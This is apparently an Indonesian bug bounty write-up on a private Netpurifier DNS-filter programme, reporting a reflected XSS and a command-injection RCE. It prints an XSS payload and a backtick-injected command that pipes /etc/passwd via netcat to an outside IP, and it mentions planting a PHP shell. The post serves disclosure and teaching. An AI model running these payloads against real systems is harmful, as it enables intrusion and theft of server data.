---
layout: post
title: "[Bug Bounty] RCE and XSS on Netpurifier Private Bug Bounty"
date: 2019-02-14 07:00
categories: bugbounty
---
<div align="center" background="black">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/logo.png?raw=true">
</div>

### <b>Prolog</b>
[Netpurifier](https://netpurifier.id/) adalah merek lain dari DNS Bersih (DNSB) untuk pasar Internasional. Netpurifier menawarkan beberapa produk dan jasa, termasuk didalamnya DNS Filtering yang disediakan gratis untuk umum. Pada kesempatan kali ini saya akan share writeup private bug bounty untuk produk DNS Filter dari Cyber Army Indonesia. Diberikan 2 alamat yang masuk dalam scope, yaitu  kominfo.demo.netpurifier.id dan trust.netpurifier.id, ternyata 2 domain tersebut terdapat dalam 1 server dengan aplikasi yang serupa, jadi total ada 6 vuln yang saya temukan.

### <b>Reconnaissance</b>
Pada tahap reconnaissance,saya menggunakan nmap dengan perintah
`nmap trust.netpurifier.id`

Disana terdapat beberapa port yang open, saya tertarik dengan port 8010. Pada saat tulisan ini dibuat saya coba scan lagi ternyata sudah filtered.

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/2019-02-14%2009_34_57-siti@master_%20~.png?raw=true">
</div>


Saat saya buka trust.netpurifier.id:8010, disana terdapat form login yang setelah saya tanyakan credentialnya menggunakan user dan password public:public. Disana terdapat beberapa menu (lupa screenshot). 

### <b>XSS via POST Request
Untuk metode XSS ini berdampak pada 2 fungsi/menu:
- Menu dblist
- Menu dnsbse

Saya tertarik dengan fungsi search yg ada di menu dnsbse, disana ada form search yang merequest google search engine. Saya coba searcing "test", ternyata inputan kita ditampilkan di browser,hmmmm... Langsung terpikir untuk input payload XSS, dengan mengirim payload XSS sejuta ummat `"><script>alert("p00w")</script>` ternyata payload dirender dengan baik.

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/XSS%20POST%202/2019-02-11%2022_50_24-trust-demo%20-%20DNSBSE.png?raw=true">
</div>


### <b>Remote Code Execution</b>
Masih ingat menu dnsbse? Tadi yang kita bahas kalau fungsi dnsbse juga merequest search engine google dan menampilkan hasilnya disana. Saya tebak kalau fungsi dnsbse itu pake curl buat request ke server googlenya,asumsinya kira-kira seperti ini:
`shell_exec('curl {website with request}')`

Saya pikir ini bisa diexploitasi dengan SSRF (Server Side Request Forgery);

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/RCE/2019-02-11%2023_33_38-siti@master_%20~_exploit.png?raw=true">
</div>

setelah mencoba beberapa payload SSRF, ternyata zonk wwkwkw `>_<` 
Saya sambil baca-baca referensi, akhirnya ketemu cara bypass stringnya hanya menggunakan backtick, sehingga kita dapat menjalankan perintah shell pada `shell_exec` tadi. 

Saya masukin request ke repeater di burp, lalu saya masukin payload `cat /etc/passwd | nc 128.199.221.101 9091` pada parameter server, dan didapatkan result:
<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/RCE/2019-02-11%2023_29_29-siti@master_%20~_exploit.png?raw=true">
</div>
Lalu saya buat shell php dan eksekusi ls -lah, dan selebihnya saya dapat explorasi server lebih dalam:

RIP SS :v 
<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/RCE/IMG_0167.JPG?raw=true">
</div>


`
- 11 February Send Report
- 12 February Valoidation
- 13 February disclose
- Rewarded
`

Reference:
- https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f